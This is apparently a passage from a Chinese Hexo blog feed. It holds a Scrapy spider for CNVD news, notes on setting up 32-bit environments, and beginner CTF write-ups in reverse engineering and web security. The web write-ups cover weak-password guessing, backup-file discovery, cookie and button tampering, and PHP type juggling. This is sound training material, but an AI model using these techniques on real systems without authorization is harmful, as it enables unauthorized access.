class="line">    <span class="comment"># 关闭数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.dbpool.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对数据进行处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        self.dbpool.runInteraction(self.insert_db,item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="comment">#插入数据</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert_db</span>(<span class="params">self, tx,item</span>):</span></span><br><span class="line">        values = (</span><br><span class="line">            item[<span class="string">&#x27;hash&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;url&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;post_date&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;body&#x27;</span>],</span><br><span class="line">            item[<span class="string">&#x27;crawl_time&#x27;</span>],</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        sql = <span class="string">&#x27;INSERT INTO secnews VALUES(%s,%s,%s,%s,%s,%s,%s)&#x27;</span></span><br><span class="line">        tx.execute(sql, values)</span><br></pre></td></tr></table></figure><p>settings.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOT_NAME = <span class="string">&#x27;secnews_spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;secnews_spiders.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;secnews_spiders.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;secnews_spiders.pipelines.MySQLPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>middlewares.py 中间件本爬虫暂时不需要。</p><p>写好代码后，shell（需要在爬虫目录下）中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl CNVD</span><br></pre></td></tr></table></figure><p>即可写入数据库。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004037.png" alt="cnvd"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004038.png" alt="cnvd2"></p><p>爬取时遇到的问题：</p><p>1.爬取数据不全：</p><p>settings.py文件中加上AUTOTHROTTLE_ENABLED = True</p><p>2.遇到错误没有记录日志，后期要加入！！！</p><p>3.后期需要前端展示，body的采集需要按原段落布局显示，所以存入数据库的应该是包含标签的html么？还是说采集处理好的文本，例如将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;p&gt; &lt;br&gt; &lt;br&#x2F;&gt;替换成\n</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 Reverse新手题</title>
      <link href="2020/03/21/2020-03-21-CTF_world_Reverse_rookie/"/>
      <url>2020/03/21/2020-03-21-CTF_world_Reverse_rookie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF攻防世界-Reverse新手题"><a href="#CTF攻防世界-Reverse新手题" class="headerlink" title="CTF攻防世界 Reverse新手题"></a>CTF攻防世界 Reverse新手题</h1><p>[TOC]</p><h1 id="【Reverse】【insanity】"><a href="#【Reverse】【insanity】" class="headerlink" title="【Reverse】【insanity】"></a>【Reverse】【insanity】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010814.png" alt="image-20200322214411606"></p><p>查壳和程序的详细信息</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010732.png" alt="image-20200322214415938"></p><p>F5查看伪函数,发现一个关键的字符串，&amp;strs,发现是取这个字符串输出，然后，跟进strs</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010739.png" alt="图片1"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010744.png" alt="图片2"></p><p>Shift + F12 打开String window,发现flag</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010748.png" alt="image-20200322214430640"></p><h1 id="【Reverse】【python-trade】"><a href="#【Reverse】【python-trade】" class="headerlink" title="【Reverse】【python-trade】"></a>【Reverse】【python-trade】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010753.png" alt="image-20200322214447698"></p><p>题目是pyc的后缀，反编译得到python源码（<a href="https://tool.lu/pyc/%EF%BC%89">https://tool.lu/pyc/）</a></p><p>编写解密脚本</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010759.png" alt="image-20200322214455627"></p><h1 id="【Reverse】【Hello-CTF】"><a href="#【Reverse】【Hello-CTF】" class="headerlink" title="【Reverse】【Hello, CTF】"></a>【Reverse】【Hello, CTF】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010826.png" alt="image-20200322214523807"></p><p>照旧，依旧先从main开始分析，然后，对main函数进行F5查看伪代码。首先是将字符串复制到v13的位置，后面对输入进行了判断，输入的字符串长度不能大于17。接着，将字符串以十六进制输出，然后再将得到的十六进制字符添加到v10。最后，进行比较，看输入的字符串是否和v10的字符串相等，如果相等，则得到真确的flag。将字符串转换为十六进制。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010832.png" alt="img"> <img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010840.png" alt="image-20200322214537385"></p><h1 id="【Reverse】【open-source】"><a href="#【Reverse】【open-source】" class="headerlink" title="【Reverse】【open-source】"></a>【Reverse】【open-source】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010847.png" alt="image-20200322214603934"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010903.png" alt="image-20200322214610795"></p><p>first = 51966 (0xcafe)</p><p>second % 17 = 8</p><p>argv[3] = “h4cky0u”</p><p>hash = 51966<em>31337+8</em>11+7-1615810207=12648430</p><p>printf(“%x\n”,hash)</p><p>得到flag:c0ffee</p><h1 id="【Reverse】【simple-unpack】"><a href="#【Reverse】【simple-unpack】" class="headerlink" title="【Reverse】【simple-unpack】"></a>【Reverse】【simple-unpack】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010911.png" alt="image-20200322214632110"></p><p><strong><em>\</em>UPX**</strong>是一款先进的可执行程序文件压缩器。压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失，和压缩之前一样可正常地运行。对于支持的大多数格式没有运行时间或内存的UPX不利后果。它支持许多不同的可执行文件格式 ：包含 Windows95/98/ME/NT/2000/XP/CE程序和动态链接库、DOS 程序、Linux 可执行文件和核心。</p><p>对于可执行程序资源压缩,是保护文件的常用手段. 俗称*<strong>*加壳**</strong>,加壳过的程序可以直接运行,但是不能查看源代码.要经过脱壳才可以查看源代码.加壳：其实是利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开后，以后的就交给真正的程序。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010919.png" alt="image-20200322214638906"></p><p>upx -d 文件名 对upx壳进行脱壳 IDA打开发现flag</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010937.png" alt="image-20200322214646056"> </p><h1 id="【Reverse】【logmein】"><a href="#【Reverse】【logmein】" class="headerlink" title="【Reverse】【logmein】"></a>【Reverse】【logmein】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010943.png" alt="图片3"><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010948.png" alt="image-20200322214704248"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011121.png" alt="image-20200322214722335"><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011129.png" alt="image-20200322214735491"></p><p>编写相应的脚本解密</p><h1 id="【Reverse】【game】"><a href="#【Reverse】【game】" class="headerlink" title="【Reverse】【game】"></a>【Reverse】【game】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011138.png" alt="image-20200322214754956"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011145.png" alt="image-20200322214801911"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011151.png" alt="image-20200322214807462"></p><h1 id="【Reverse】【getit】"><a href="#【Reverse】【getit】" class="headerlink" title="【Reverse】【getit】"></a>【Reverse】【getit】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011158.png" alt="image-20200322214830585"></p><p>编写相应的脚本解密</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011203.png" alt="img"> <img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011208.png" alt="image-20200322214843878"></p><h1 id="【Reverse】【re1】"><a href="#【Reverse】【re1】" class="headerlink" title="【Reverse】【re1】"></a>【Reverse】【re1】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011216.png" alt="image-20200322214903797"></p><p><strong>方法一：</strong></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011220.png" alt="image-20200322214949459"> </p><p>这是整个main函数的运算逻辑。可以看到一个关键的字符串，print(aFlag_0)，查看aFlag_0，</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011229.png" alt="image-20200322215001688"></p><p>再查看else里输出的flag get，所以flag应该在程序里。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011233.png" alt="image-20200322215027959"> </p><p>可以看到v3的值，是由strcmp()决定的，比较v5和输入的字符串，如果一样就会进入后面的if判断，所以,我们继续往上分析，看看哪里又涉及v5，可以看到开头的_mm_storeu_si128(），对其进行分析发现它类似于memset(),将xmmword_413E34的值赋值给v5，所以，我们可以得到正确的flag应该在xmmword_413E34中，然后，我们双击413E34进行跟进，可以看到一堆十六进制的数。</p><p>这时，我们使用<strong>IDA的另一个功能 R ，能够将十进制的数转换为字符串</strong>。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011346.png" alt="image-20200322215056896"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011341.png" alt="image-20200322215101566"></p><p>这就是我们最后的flag了。</p><p>注：这里要跟大家普及一个知识了，及大端与小端。假设一个十六进制数0x12345678，大端的存储方式是：12,34,56,78，然后读取的时候也是从前往后读，小端的存储方式是：78,56,34,12，然后读取的时候是从后往前读取。所以，最后的flag应该是：DUTCTF{We1c0met0DUTCTF}.</p><p><strong>方法二:</strong></p><p>动态调试，利用IDA windbg调试器,从scanf获取字符串位置看，ebp+var_24处存放的是输入字符串，那么ebp+var_44处存放的应该就是Flag，在所示位置F2下断点，执行到当前位置，点开ecx发现flag。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011358.png" alt="image-20200322215146476"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011403.png" alt="image-20200322215150579"></p><h1 id="【Reverse】【no-strings-attached】"><a href="#【Reverse】【no-strings-attached】" class="headerlink" title="【Reverse】【no-strings-attached】"></a>【Reverse】【no-strings-attached】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011409.png" alt="image-20200322215200442"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011413.png" alt="image-20200322215207738"></p><p>通过简单地探索，发现除了authenticate()函数外，其他函数对自己没啥用。</p><p>所以直接进authenticate()函数进行分析。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011419.png" alt="image-20200322215241353"></p><p>这个函数大体意思就是将输入的字符串数据ws和存在于函数内部的字符串数据s2进行比对，然后再进行下一步操作。通过分析可知s2保存的就是flag。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011423.png" alt="image-20200322215329671"></p><p>函数decrypt()，因为参数和算法都是已经定义好的跟输入没关系，那么函数调用完成后返回的dest会保存在哪里，我们直接找到程序运行时保存dest的地址然后dump出来分析就OK了。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011432.png" alt="image-20200322215335196"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011436.png" alt="image-20200322215338703"></p><p>找到decrypt运行结束地址，0x8048725。故直接动态调试程序，然后在decrypt()处下断点单步执行到保存dest的值于eax代码后，查看eax保存的值就可以了。</p><p>1.在decrypt()处下断点。 <strong>b *0x8048725</strong></p><p>2.单步执行decrypt()函数。<strong>n</strong></p><p>3.执行完毕后查看寄存器<strong>eax</strong>保存的值。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011511.png" alt="image-20200322215420542"></p><p>执行一行源程序代码，此行代码中的函数调用也一并执行，就是执行decrypt()函数。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011511.png" alt="image-20200322215425180"></p><p>x:examine–&gt;检测内存地址中保存的值</p><p>5:显示5行目标数据</p><p>s:以字符串形式打印</p><p>w:以双字打印</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011520.png" alt="image-20200322215432805"></p><h1 id="【Reverse】【csaw2013reversing2】"><a href="#【Reverse】【csaw2013reversing2】" class="headerlink" title="【Reverse】【csaw2013reversing2】"></a>【Reverse】【csaw2013reversing2】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011526.png" alt="image-20200322221233259"></p><p>查看伪代码和流程</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011935.png" alt="image-20200322221239419"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011949.png" alt="image-20200322221245700"></p><p>sub_40100 为解密函数，必须经过，所以修改 jz short loc_4010B9 为 jmp short loc_401096.</p><p>loc_4010B9输出flag的函数，解密完应跳转到loc_4010B9</p><p>具体修改步骤：</p><p>修改 int 3 为 NOP. （汇编中int是中断指令。这里是要引发中断3的中断。所以要改）</p><p>修改 jmp short loc_4010EF 为 jmp short loc_4010B9.</p><p>修改 jz short loc_4010B9 为 jmp short loc_401096.</p><p>IDA修改指令</p><p>点击Edit &gt; Patch program &gt; Assemble</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011957.png" alt="image-20200322221258374"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012005.png" alt="image-20200322221305957"></p><p>最后点击Edit &gt; Patch program &gt; Apply pathes to input file &gt; OK</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012012.png" alt="image-20200322221312019"></p><p>保存运行得到flag。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012019.png" alt="image-20200322221316811"></p><h1 id="【Reverse】【maze】"><a href="#【Reverse】【maze】" class="headerlink" title="【Reverse】【maze】"></a>【Reverse】【maze】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012025.png" alt="image-20200322221327757"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012030.png" alt="image-20200322221335926"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012040.png" alt="image-20200322221343091"></p><p>首先判断输入的字符串，从这里可以看出要求输入的flag长度为24，且以 ‘nctf{‘ 开头，以 ‘}’ 结尾（最后的 ‘}’ 。</p><p>由于是迷宫，一般是二维的，所以应该有一个记录坐标的变量，看到v10，在判断中有一个&amp;v10和(&amp;v10)+1（也就是v10跟着的的下一个字节的地址），那么可以猜想v10就是一个记录位置坐标信息的二维数组。那么while循环就是在判断输入的字符来改变坐标信息，也就是用户输入字符来走迷宫。猜测v10和v10+1对应着迷宫的行和列。</p><p>既然是走迷宫，当然就得判断走没走到终点，看到最后的“Congratulations！”，那看一下它前面的判断，判断坐标所在，如果是“#”，就到终点了，说明“#”号就代表终点。而且看一下asc_601060有个“#”，看来这应该就是迷宫的地图了。我们的目标就是要走到“#”处。</p><p>再回过头来看8*v10+SHIDWORD(v10)，既然是坐标，说明v10就代表行，而v10+1代表列，而且可以知道迷宫的地图应该是8个字符一行的（因为行增加一，数就增加8）。</p><p>至于这个LABLE_15，每走一步都要进入这里，应该就是判断有没有越界什么的函数。</p><p>现在基本上就已经理清楚了这个迷宫，只要知道怎么走就行了。while循环里的函数如下：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424012051.png" alt="image-20200322221351518"></p><p>[v10,v10 + 1]为坐标</p><p>sub_400650纵坐标减1，即’O’代表列减1，即←。</p><p>sub_400660纵坐标加1，即’o’代表列加1，即→。</p><p>sub_400670行坐标减1，即’.’代表行减1，即↑。</p><p>sub_400680行坐标加1，即’0’代表行加1，即↓。</p><p>编写脚本解密</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424011835.png" alt="image-20200322221357645"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA修改指令</title>
      <link href="2020/03/20/2020-03-20-IDA_modify_instructions/"/>
      <url>2020/03/20/2020-03-20-IDA_modify_instructions/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA修改指令"><a href="#IDA修改指令" class="headerlink" title="IDA修改指令"></a>IDA修改指令</h1><p>点击Edit &gt; Patch program &gt; Assemble</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003923.png" alt="image-20200320224922561"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003924.png" alt="image-20200320224927253"></p><p>最后点击Edit &gt; Patch program &gt; Apply pathes to input file &gt; OK</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003925.png" alt="image-20200320224933739"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位Kali和Ubuntu安装32位运行环境和编译环境</title>
      <link href="2020/03/19/2020-03-19-64bit_Kali_Ubuntu_Install_32bit_runtime_compilation_environment/"/>
      <url>2020/03/19/2020-03-19-64bit_Kali_Ubuntu_Install_32bit_runtime_compilation_environment/</url>
      
        <content type="html"><![CDATA[<h1 id="64位Kali和Ubuntu安装32位运行环境和编译环境"><a href="#64位Kali和Ubuntu安装32位运行环境和编译环境" class="headerlink" title="64位Kali和Ubuntu安装32位运行环境和编译环境"></a>64位Kali和Ubuntu安装32位运行环境和编译环境</h1><p>今天在做ctf题时，发现64位系统运行调试不了32位的elf程序，故查找资料安装32位运行和编译环境。</p><h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p>安装32位运行环境</p><p>这里使用kali的原始更新源，使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure><p>在文本中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>保存文本后关闭</p><p>接下来执行下列命令：</p><ul><li><p>启用兼容模式：dpkg –add-architecture i386 </p></li><li><p>升级一下：apt-get update </p></li><li><p>安装：apt-get install libc6:i386 </p></li></ul><p>安装32位编译环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc-multilib </span><br><span class="line">apt-get install g++-multilib</span><br></pre></td></tr></table></figure><h1 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h1><p>安装32位运行环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386</span><br></pre></td></tr></table></figure><p>安装32位编译环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-multilib </span><br><span class="line">sudo apt-get install g++-multilib</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 web新手题</title>
      <link href="2020/03/19/2020-03-19-CTF_world_web_rookie/"/>
      <url>2020/03/19/2020-03-19-CTF_world_web_rookie/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF攻防世界-web新手题"><a href="#CTF攻防世界-web新手题" class="headerlink" title="CTF攻防世界 web新手题"></a>CTF攻防世界 web新手题</h1><p>[TOC]</p><h1 id="【WEB】【view-source】"><a href="#【WEB】【view-source】" class="headerlink" title="【WEB】【view_source】"></a>【WEB】【view_source】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002207.png" alt="image-20200318204244348"></p><p>打开网页</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002404.png" alt="image-20200318204311203"></p><p>鼠标右键无效，利用F12打开调试查看源码，发现flag</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002409.png" alt="image-20200318204318415"></p><h1 id="【WEB】【robots】"><a href="#【WEB】【robots】" class="headerlink" title="【WEB】【robots】"></a>【WEB】【robots】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002426.png" alt="image-20200318204327894"></p><p>由提示，robors协议，想到网页防爬机制会设定robots.txt，表示哪些路径可以访问，哪些不可以访问。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002225.png" alt="image-20200318204335997"></p><p>看到flag_is_h3re.php</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002436.png" alt="image-20200318204343215"></p><h1 id="【WEB】【backup】"><a href="#【WEB】【backup】" class="headerlink" title="【WEB】【backup】"></a>【WEB】【backup】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002628.png" alt="image-20200318204613443"></p><p>由提示，inde.php的备份文件</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002635.png" alt="image-20200318205006071"></p><p>php的备份有两种:*.php~和*.php.bak</p><p>尝试访问index.php~无效，打开index.php/bak，得到文件</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002642.png" alt="image-20200318205012221"></p><p>利用网页打开查看源代码，或者直接文本打开，可看到flag.</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002648.png" alt="image-20200318205029033"></p><h1 id="【WEB】【cookie】"><a href="#【WEB】【cookie】" class="headerlink" title="【WEB】【cookie】"></a>【WEB】【cookie】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002655.png" alt="image-20200318205035216"></p><p>由提示，查看页面cookie.</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002701.png" alt="image-20200318205039257"></p><p>查看cookie，发现cookie.php,访问，提示查看响应，得到flag.</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002710.png" alt="image-20200318205047675"></p><h1 id="【WEB】【disabled-button】"><a href="#【WEB】【disabled-button】" class="headerlink" title="【WEB】【disabled_button】"></a>【WEB】【disabled_button】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002755.png" alt="image-20200318205055946"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002801.png" alt="image-20200318205100695"></p><p>根据提示，把按钮改成可以按下去。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002807.png" alt="image-20200318205105330"></p><p>删除disable=””,点击按钮，得到flag</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002818.png" alt="image-20200318205114520"></p><h1 id="【WEB】【weak-auth】"><a href="#【WEB】【weak-auth】" class="headerlink" title="【WEB】【weak_auth】"></a>【WEB】【weak_auth】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002833.png" alt="image-20200318205121706"></p><p>由提示，weak_auth+随手设了一个密码，应该是弱口令。尝试admin+123456组合。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002839.png" alt="image-20200318205125805"></p><p>得到flag.</p><p>cyberpeace{1092d6c1741b7e90a3ce28fa81db0cfe}</p><h1 id="【WEB】【simple-php】"><a href="#【WEB】【simple-php】" class="headerlink" title="【WEB】【simple_php】"></a>【WEB】【simple_php】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002849.png" alt="image-20200318205204729"></p><p>观察代码发现，得到flag需要构造a和b</p><p>php类型比较表：<a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p><p>a的要求是等于0又要是非零</p><p>b的要求是不能是数字但又要大于1234</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002858.png" alt="image-20200318205208153"><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002906.png" alt="image-20200318205211866"></p><p>于是构造</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003057.png" alt="image-20200318205217663"></p><h1 id="【WEB】【get-post】"><a href="#【WEB】【get-post】" class="headerlink" title="【WEB】【get_post】"></a>【WEB】【get_post】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003109.png" alt="image-20200318205227590"></p><p>使用HackerBar</p><p>github入口：<a href="https://github.com/Mr-xn/hackbar2.1.3">https://github.com/Mr-xn/hackbar2.1.3</a></p><p>HackerBar<br>是一个Firefox的插件,可以帮助你在测试SQL注入,XSS漏洞和网站的安全性,主要是帮助开发人员做代码的安全审计,检查代码,寻找安全漏洞.</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424002311.png" alt="image-20200318205233093"></p><p>或者用python脚本post数据,或者使用curl(curl是一个命令行工具,通过指定的URL来上传或下载数据,并将数据展示出来)</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003121.png" alt="image-20200318205238261"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003130.png" alt="image-20200318205242555"></p><h1 id="【WEB】【xff-referer】"><a href="#【WEB】【xff-referer】" class="headerlink" title="【WEB】【xff_referer】"></a>【WEB】【xff_referer】</h1><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424003140.png" 